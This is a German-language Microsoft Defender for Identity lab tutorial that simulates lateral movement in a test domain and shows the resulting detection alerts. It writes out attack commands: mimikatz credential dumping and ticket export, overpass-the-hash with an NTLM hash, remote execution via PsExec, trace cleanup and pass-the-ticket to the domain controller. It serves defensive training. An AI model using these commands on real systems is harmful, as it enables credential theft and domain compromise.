---
title: Playbook zu Microsoft Defender for Identity-Sicherheitswarnungen zu Lateral Movement
description: Dieses Microsoft Defender for Identity-Playbook beschreibt, wie Sie Lateral Movement-Bedrohungen zur Erkennung durch Defender for Identity simulieren.
ms.date: 10/26/2020
ms.topic: tutorial
ms.openlocfilehash: 50880150bb8937875677985f3a61119495d566eb
ms.sourcegitcommit: cdb7ae4580851e25aae24d07e7d66a750aa54405
ms.translationtype: HT
ms.contentlocale: de-DE
ms.lasthandoff: 12/03/2020
ms.locfileid: "96542701"
---
# <a name="tutorial-lateral-movement-playbook"></a>Tutorial: Lateral Movement-Playbook

Das Lateral Movement-Playbook ist das dritte Tutorial der vierteiligen Reihe zu [!INCLUDE [Product long](includes/product-long.md)]-Sicherheitswarnungen. Das Lab zu [!INCLUDE [Product short](includes/product-short.md)]-Sicherheitswarnungen soll die Funktionen von **[!INCLUDE [Product short](includes/product-short.md)]** zum Identifizieren und Erkennen verdächtiger Aktivitäten und potenzieller Angriffe auf Ihr Netzwerk veranschaulichen. Das Playbook erläutert, wie Sie einige der *diskreten* Erkennungen von [!INCLUDE [Product short](includes/product-short.md)] testen. Dieses Playbook konzentriert sich auf *signaturbasierte* Funktionen von [!INCLUDE [Product short](includes/product-short.md)] und enthält keine erweiterten Verhaltenserkennungen auf Machine Learning-, Benutzer- oder Entitätsbasis, da diese eine Lernphase mit echtem Netzwerkverkehr über einen Zeitraum von bis zu 30 Tagen erfordern. Weitere Informationen zu den einzelnen Tutorials dieser Reihe finden Sie unter [Tutorialübersicht: [!INCLUDE [Product short](includes/product-short.md)]-Sicherheitswarnungsumgebung](playbook-lab-overview.md).

Dieses Playbook stellt einige der Dienste für Bedrohungserkennungen und Sicherheitswarnungen von [!INCLUDE [Product short](includes/product-short.md)] in Bezug auf Lateral Movement-Pfade vor. Dabei werden Angriffe durch allgemeine, reale und öffentlich verfügbare Hacker- und Angriffstools simuliert.

In diesem Lernprogramm führen Sie folgende Schritte aus:

> [!div class="checklist"]
>
> - Sammeln von NTLM-Hashes und Simulieren eines Overpass-the-Hash-Angriffs, um ein Kerberos Ticket-erteilendes Ticket (TGT) zu erhalten.
> - Ausgeben als ein anderer Benutzer und Lateral Movement durch das Netzwerk, um weitere Anmeldeinformationen zu sammeln.
> - Simulieren eines Pass-the-Ticket-Angriff, um Zugriff auf den Domänencontroller zu erhalten.
> - Überprüfen der Sicherheitswarnungen aufgrund von Lateral Movement in [!INCLUDE [Product short](includes/product-short.md)].

## <a name="prerequisites"></a>Voraussetzungen

1. [Ein vollständiges [!INCLUDE [Product short](includes/product-short.md)]-Sicherheitswarnungslab](playbook-setup-lab.md)
    - Sie sollten die Setupanweisungen für die Testumgebung genau einhalten. Je genauer Ihr Lab dem vorgeschlagenen Labsetup entspricht, desto einfacher können Sie die [!INCLUDE [Product short](includes/product-short.md)]-Testverfahren befolgen.

2. [Abschluss des Tutorials zum Playbook zu Reconnaissance](playbook-reconnaissance.md)

## <a name="lateral-movement"></a>Seitliche Verschiebung

Aus unseren simulierten Angriffen im vorherigen Tutorial, dem Playbook zu Reconnaissance, haben wir umfangreiche Netzwerkinformationen gewonnen. Unser Ziel während dieser Lateral Movement-Phase des Labs ist es, mit diesen Informationen an die bereits entdeckten kritischen IP-Adressen heranzukommen und die Warnungen von [!INCLUDE [Product short](includes/product-short.md)] zur Verlagerung anzuzeigen. In der vorherigen Simulation des Reconnaissance-Labs haben wir 10.0.24.6 als Ziel-IP identifiziert, da dort die Computeranmeldeinformationen von SamiraA verfügbar gemacht wurden. Wir werden verschiedene Angriffsmethoden nachahmen, um zu versuchen, uns seitlich durch die Domäne zu bewegen.

## <a name="dump-credentials-in-memory-from-victimpc"></a>Sichern von Anmeldeinformationen im Speicher von VictimPC

Während unserer simulierten Reconnaissanceangriffe wurde **VictimPC** nicht nur für die Anmeldeinformationen von JeffL verfügbar gemacht. Es gibt noch andere nützliche Konten auf diesem Computer zu entdecken. Um eine seitliche Bewegung mit **VictimPC** zu erzielen, werden wir versuchen, die Anmeldedaten im Speicher der freigegebenen Ressource zu enumerieren. Das Sichern von speicherinternen Anmeldeinformationen mit **mimikatz** ist eine beliebte Angriffsmethode mit einem gängigen Tool.

### <a name="mimikatz-sekurlsalogonpasswords"></a>Mimikatz sekurlsa::logonpasswords

1. Öffnen Sie eine **Eingabeaufforderung mit erhöhten Rechten** auf **VictimPC**.
1. Navigieren Sie zu dem Ordner „Tools“, in dem Sie Mimikatz gespeichert haben, und führen Sie den folgenden Befehl aus:

    ```dos
    mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" "exit" >> c:\temp\victimcpc.txt
    ```

1. Öffnen Sie **c:\\temp\\victimpc.txt**, um die von Mimikatz gesammelten und in die txt-Datei geschrieben Anmeldeinformationen anzuzeigen.
    ![Mimikatz-Ausgabe einschließlich RonHDs NTLM-Hash](media/playbook-lateral-sekurlsa-logonpasswords-output.png).

1. Wir haben RonHDs NTLM-Hash mit Hilfe von Mimikatz erfolgreich aus dem Speicher geholt. Wir benötigen den NTLM-Hash in Kürze.

    > [!Important]
    >
    > - Es ist zu erwarten und normal, dass sich die in diesem Beispiel gezeigten Hashes von den Hashes unterscheiden, die Sie in Ihrer eigenen Testumgebung sehen. Der Zweck dieser Übung ist es, zu verstehen, wie die Hashes gewonnen wurden, wie ihre Werte abgerufen werden und wie sie in den nächsten Phasen eingesetzt werden.
    > - Die Anmeldeinformationen des Computerkontos wurde ebenfalls erfasst. Auch wenn die Anmeldeinformationen des Computerkontos in unserer aktuellen Testumgebung nicht hilfreich sind, denken Sie daran, dass dies ein weiterer Weg ist, den echte Angreifer nutzen, um seitliche Bewegung in Ihrer Umgebung zu umzusetzen.

### <a name="gather-more-information-about-the-ronhd-account"></a>Sammeln von weiteren Informationen über das RonHD-Konto

Ein Angreifer weiß möglicherweise zunächst nicht, wer RonHD ist oder wie hoch sein Wert als Ziel ist. Alles, was sie wissen, ist, dass sie die Anmeldeinformationen verwenden können, wenn dies vorteilhaft ist. Mit dem Befehl **net** können wir jedoch als Angreifer herausfinden, in welchen Gruppen RonHD Mitglied ist.

Führen Sie auf **VictimPC** den folgenden Befehl aus:

```dos
net user ronhd /domain
```

![Reconnaissance mit dem RonHD-Konto](media/playbook-lateral-sekurlsa-logonpasswords-ronhd_discovery.png)

Aus den Ergebnissen geht hervor, dass RonHD ist Mitglied der Sicherheitsgruppe „Helpdesk“ ist. Wir wissen, dass wir durch RonHD Berechtigungen erhalten, die mit dem Konto *und* der Sicherheitsgruppe „Helpdesk“ verbunden sind.

### <a name="mimikatz-sekurlsapth"></a>Mimikatz sekurlsa::pth

Unter Verwendung einer gebräuchlichen Methode namens **Overpass-the-Hash** wird der gesammelte NTLM-Hash verwendet, um ein TGT zu erhalten. Ein Angreifer mit dem TGT eines Benutzers kann sich als kompromittierter Benutzer wie RonHD ausgeben. Während wir uns als RonHD ausgeben, können wir auf jede Domänenressource zugreifen, auf die der betroffene Benutzer Zugriff hat oder auf die seine jeweiligen Sicherheitsgruppen Zugriff haben.

1. Wechseln Sie von **VictimPC** in das Verzeichnis mit dem Ordner **Mimikatz.exe**. in Ihrem Dateisystem, und führen Sie den folgenden Befehl aus:

    ```dos
    mimikatz.exe "privilege::debug" "sekurlsa::pth /user:ronhd /ntlm:96def1a633fc6790124d5f8fe21cc72b /domain:contoso.azure" "exit"
    ```

    > [!Note]
    > Wenn Ihr Hash für RonHD in den vorherigen Schritten nicht identisch war, ersetzen Sie den obigen NTLM-Hash durch den Hash, den Sie aus *victimpc.txt* gesammelt haben.

    ![Overpass-the-Hash über Mimikatz](media/playbook-lateral-opth1.png)

1. Überprüfen Sie, ob eine neue Eingabeaufforderung geöffnet wird. Es wird als RonHD ausgeführt, aber das ist vielleicht *noch* nicht ersichtlich. Schließen Sie die neue Eingabeaufforderung nicht, da Sie sie als nächstes verwenden werden.

[!INCLUDE [Product short](includes/product-short.md)] erkennt keinen Hash, der an eine lokale Ressource übergeben wird. [!INCLUDE [Product short](includes/product-short.md)] erkennt, wenn ein Hash **von einer Ressource für den Zugriff** auf eine andere Ressource oder einen Dienst verwendet wird.

### <a name="additional-lateral-move"></a>Zusätzliche seitliche Bewegung

Haben wir jetzt mit den Anmeldeinformationen von RonHD Zugriffsmöglichkeiten, die wir bisher mit den Anmeldeinformationen von JeffL nicht hatten?
Wir verwenden **PowerSploit** ```Get-NetLocalGroup```, um diese Frage zu beantworten.

1. Führen Sie in der Befehlskonsole, die sich aufgrund unseres vorherigen Angriffs geöffnet hat und als RonHD ausgeführt wird, die folgenden Elemente aus:

    ```powershell
    Set-ExecutionPolicy -Scope Process -ExecutionPolicy Bypass
    Import-Module C:\tools\PowerSploit\PowerSploit.psm1 -Force
    Get-NetLocalGroup 10.0.24.6
    ```

    ![Lokale Administratoren für 10.0.24.6 über PowerSploit abrufen](media/playbook-lateral-adminpcsamr.png)

    Im Hintergrund identifiziert Remote SAM die lokalen Administratoren für die IP, die wir zuvor identifiziert haben und die in einem Domänenadministrator-Konto verfügbar war.

    Die Ausgabe sieht etwa wie folgt:

    ![Ausgabe der PowerSploit Get-NetLocalGroup](media/playbook-lateral-adminpcsamr_results.png)

    Dieses System verfügt über zwei lokale Administratoren, den integrierten Administrator „ContosoAdmin“ und „Helpdesk“. Wir wissen, dass RonHD Mitglied der Sicherheitsgruppe „Helpdesk“ ist. Wir kennen auch den Namen des Computers, AdminPC. Da wir die Anmeldeinformationen von RonHD haben, sollten wir sie verwenden können, um seitlich auf den AdminPC zu wechseln und Zugriff auf diesen Computer zu erhalten.

1. Geben Sie in der *gleichen Eingabeaufforderung , die im Kontext von RonHD* ausgeführt wird, **exit** ein, um PowerShell bei Bedarf zu verlassen. Führen Sie dann den folgenden Befehl aus:

    ```dos
    dir \\adminpc\c$
    ```

1. Der Zugriff auf AdminPC war erfolgreich. Schauen wir uns an, welche Tickets wir haben. Führen Sie an derselben Eingabeaufforderung den folgenden Befehl aus:

    ```dos
    klist
    ```

    ![Verwenden von „klist“, um Kerberos-Tickets in unserem aktuellen cmd.exe-Prozess anzuzeigen](media/playbook-lateral-klist.png)

Sie sehen, dass er Speicher in diesem bestimmten Prozess ein TGT von RonHD enthält. Wir haben erfolgreich einen Overpass-the-Hash-Angriff in unserer Testumgebung durchgeführt. Wir haben den zuvor kompromittierten NTLM-Hash konvertiert und damit einen Kerberos-TGT erhalten. Dieses Kerberos-TGT wurde dann verwendet, um Zugriff auf eine andere Netzwerkressource zu erhalten, in diesem Fall AdminPC.

### <a name="overpass-the-hash-detected-in-product-short"></a>Overpass-the-Hash in [!INCLUDE [Product short](includes/product-short.md)] erkannt

In der [!INCLUDE [Product short](includes/product-short.md)]-Konsole sehen wir Folgendes:

![[!INCLUDE [Product short](includes/product-short.md)] bei der Erkennung des Overpass-the-Hash-Angriffs](media/playbook-lateral-opthdetection.png)

[!INCLUDE [Product short](includes/product-short.md)] hat erkannt, dass RonHDs Konto auf VictimPC kompromittiert und dann verwendet wurde, um erfolgreich einen Kerberos-TGT zu erhalten. Wenn wir in der Benachrichtigung auf den Namen von RonHD klicken, werden wir zur Logical Activity-Zeitachse von RonHD weitergeleitet, wo wir unsere Untersuchung fortsetzen können.

![Anzeige der Erkennung in der Logical Activity-Zeitachse](media/playbook-lateral-opthlogicalactivity.png)

Im Security Operations Center wird unser Security Analyst auf die gefährdeten Berechtigungen aufmerksam gemacht und kann schnell feststellen, auf welche Ressourcen zugegriffen wurde.

## <a name="domain-escalation"></a>Domänenausweitung

Von unserem simulierten Angriff aus haben wir nicht nur Zugriff auf AdminPC, wir haben auch Administratorrechte auf AdminPC validiert. Wir können nun seitlich auf AdminPC wechseln und weitere Anmeldeinformationen sammeln.

Hier werden wir:

- Mimikatz auf AdminPC bereistellen
- Tickets auf AdminPC sammeln
- Pass-the-Ticket an SamiraA

### <a name="pass-the-ticket"></a>Pass-the-Ticket

Wechseln Sie über die Eingabeaufforderung, die im Kontext von *RonHD* auf **VictimPC** ausgeführt wird, zu dem Ort, an dem sich unsere allgemeinen Angriffstools befinden. Führen Sie dann *xcopy* aus, um diese Tools auf den AdminPC zu verlagern:

```dos
xcopy mimikatz.exe \\adminpc\c$\temp
```

Drücken Sie bei Aufforderung `d` und geben Sie an, dass der Ordner „temp“ ein Verzeichnis auf dem AdminPC ist.

![Kopieren von Dateien zu AdminPC](media/playbook-escalation-xcopy1.png)

### <a name="mimikatz-sekurlsatickets"></a>Mimikatz sekurlsa::tickets

Da Mimikatz auf AdminPC bereitgestellt wurde, werden wir PsExec verwenden, um es remote auszuführen.

1. Wechseln Sie zum Speicherort von PsExec, und führen Sie den folgenden Befehl aus:

    ```dos
    PsExec.exe \\AdminPC -accepteula cmd /c (cd c:\temp ^& mimikatz.exe "privilege::debug" "sekurlsa::tickets /export" "exit")
    ```

    Dieser Befehl führt die im Prozess LSASS.exe gefundenen Tickets aus und exportiert sie in das aktuelle Verzeichnis auf dem AdminPC.

1. Wir müssen die Tickets von AdminPC zurück zu VictimPC kopieren. Da wir für dieses Beispiel nur an SamiraA's Tickets interessiert sind, führen Sie den folgenden Befehl aus:

    ```dos
    xcopy \\adminpc\c$\temp\*SamiraA* c:\temp\adminpc_tickets
    ```

    ![Export der gesammelten Anmeldeinformationen von AdminPC zurück zu VictimPC](media/playbook-escalation-export_tickets2.png)

1. Lassen Sie uns unsere Spuren auf dem AdminPC beseitigen, indem wir unsere Dateien löschen.

    ```dos
    rmdir \\adminpc\c$\temp /s /q
    ```

    > [!Note]
    > Erfahrenere Angreifer werden den Datenträger nicht berühren, wenn sie beliebigen Code auf einem Computer ausführen, nachdem sie Administratorrechte auf ihm erhalten haben.

    Auf **VictimPC** haben wir diese gesammelten Tickets im Ordner **c:\temp\adminpc_tickets**:

    ![C:\temp\tickets ist unsere exportierte Mimikatz-Ausgabe aus AdminPC](media/playbook-escalation-export_tickets4.png)

### <a name="mimikatz-kerberosptt"></a>Mimikatz Kerberos::ptt

Die Tickets befinden sich jetzt lokal auf VictimPC. Nun ist es an der Zeit, durch „Pass-the-Ticket“ zu SamiraA zu werden.

1. Öffnen Sie vom Speicherort von **Mimikatz** auf dem Dateisystem von **VictimPC** aus eine neue **Eingabeaufforderung mit erhöhten Rechten**, und führen Sie den folgenden Befehl aus:

    ```dos
    mimikatz.exe "privilege::debug" "kerberos::ptt c:\temp\adminpc_tickets" "exit"
    ```

    ![Importieren der den gestohlenen Tickets in den cmd.exe-Prozess](media/playbook-escalation-ptt1.png)

1. Überprüfen Sie in derselben Eingabeaufforderung mit erhöhten Rechten, ob sich die richtigen Tickets in der Eingabeaufforderungssitzung befinden. Führen Sie den folgenden Befehl aus:

    ```dos
    klist
    ```

    ![Ausführen von „klist“, um die importierten Tickets im CMD-Prozess anzuzeigen](media/playbook-escalation-ptt2.png)

1. Beachten Sie, dass diese Tickets ungenutzt bleiben. Wir haben als Angreifer fungiert und das Ticket erfolgreich übergeben. Wir haben die Anmeldeinformationen von SamirA von AdminPC gesammelt und sie dann an einen anderen Prozess weitergegeben, der auf VictimPC ausgeführt wird.

    > [!Note]
    > Genau wie bei Pass-the-Hash weiß [!INCLUDE [Product short](includes/product-short.md)] nicht, dass das Ticket aufgrund der lokalen Clientaktivität weitergegeben wurde. [!INCLUDE [Product short](includes/product-short.md)] erkennt jedoch die Aktivität, *sobald das Ticket verwendet wird*, d. h. wenn es für den Zugriff auf eine andere Ressource oder einen anderen Dienst genutzt wird.

1. Schließen Sie Ihren simulierten Angriff ab, indem Sie von **VictimPC** aus auf den Domänencontroller zugreifen. Führen Sie in der Eingabeaufforderung, die jetzt mit den Tickets von SamirA im Speicher ausgeführt wird, folgenden Befehl aus:

    ```dos
    dir \\ContosoDC\c$
    ```

    ![Zugriff auf das Laufwerk „C:\“ von ContosoDC mit den Anmeldeinformationen von SamirA](media/playbook-escalation-ptt3.png)

Gratulation, das Programm funktioniert! Durch unsere Scheinangriffe erhielten wir Administratorzugriff auf unseren Domänencontroller und konnten die Active Directory-Domäne/-Gesamtstruktur unseres Testumgebung kompromittieren.

### <a name="pass-the-ticket-detection-in-product-short"></a>Pass-the-Ticket-Erkennung in [!INCLUDE [Product short](includes/product-short.md)]

Die meisten Sicherheitstools haben keine Möglichkeit zu erkennen, wann eine legitime Berechtigung für den Zugriff auf eine legitime Ressource verwendet wurde. Was erkennt [!INCLUDE [Product short](includes/product-short.md)] im Gegensatz dazu in dieser Kette von Ereignissen und warnt dann davor?

- [!INCLUDE [Product short](includes/product-short.md)] hat den Diebstahl der Tickets von SamirA von AdminPC und die Verlagerung auf VictimPC erkannt.
- Das [!INCLUDE [Product short](includes/product-short.md)]-Portal zeigt außerdem genau an, auf welche Ressourcen mit den gestohlenen Tickets zugegriffen wurde.
- Sie erhalten wichtige Informationen, um genau festzustellen, wo Sie mit Ihrer Untersuchung beginnen und welche Abhilfemaßnahmen zu ergreifen sind.

[!INCLUDE [Product short](includes/product-short.md)]-Erkennungen und -Warnmeldungen sind von größter Bedeutung für jedes Digital Forensics Incident Response-Team (DFIR). Sie können nicht nur die gestohlenen Anmeldeinformationen sehen, sondern auch feststellen, welche Ressourcen das gestohlene Ticket für den Zugriff und die Kompromittierung verwendet hat.

![[!INCLUDE [Product short](includes/product-short.md)] erkennt Pass-the-Ticket mit zweistündiger Unterdrückung](media/playbook-escalation-pttdetection.png)

> [!NOTE]
> Dieses Ereignis wird auf der [!INCLUDE [Product short](includes/product-short.md)]-Konsole erst nach **2 Stunden** angezeigt. Ereignisse dieser Art werden für diesen Zeitraum gezielt unterdrückt, um Fehlalarme zu reduzieren.

## <a name="next-steps"></a>Nächste Schritte

Der nächste Schritt in der Kette der Angriffsabwehr ist Domänendominanz.

> [!div class="nextstepaction"]
> [Playbook zur [!INCLUDE [Product short](includes/product-short.md)]-Domänendominanz](playbook-domain-dominance.md)

## <a name="join-the-community"></a>Beitritt zur Community

Haben Sie weitere Fragen, oder möchten Sie mit anderen über [!INCLUDE [Product short](includes/product-short.md)] und damit verbundene Sicherheitsaspekte diskutieren? Treten Sie noch heute der [[!INCLUDE [Product short](includes/product-short.md)]Community](https://techcommunity.microsoft.com/t5/Azure-Advanced-Threat-Protection/bd-p/AzureAdvancedThreatProtection) bei.
